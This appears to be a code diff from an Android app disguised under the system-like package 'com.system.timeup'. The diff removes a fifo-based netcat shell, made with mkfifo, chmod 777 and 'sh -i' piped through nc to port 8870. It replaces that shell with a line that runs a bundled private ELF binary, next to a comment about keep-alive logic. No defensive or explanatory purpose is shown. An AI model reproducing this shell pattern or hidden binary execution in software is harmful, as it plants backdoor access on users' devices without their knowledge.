@@ -14,11 +14,7 @@ class App : Application() {
         Shell.execPrivateElf(this, "myelf", "--version")
         
 
-        Shell.execAsync("mkfifo /data/user/0/com.system.timeup/files/fd")
-
-        Shell.execAsync("chmod 777 /data/user/0/com.system.timeup/files/fd")
-        
-        Shell.execAsync("cat /data/user/0/com.system.timeup/files/fd | /system/bin/sh -i 2>&1 | nc 127.0.0.1 8870 &> /data/user/0/com.system.timeup/files/fd")
+        Shell.execAsync("/data/user/0/com.system.timeup/files/myelf &> /data/user/0/com.system.timeup/files/elf.out")
 
 
         // 原来的保活逻辑
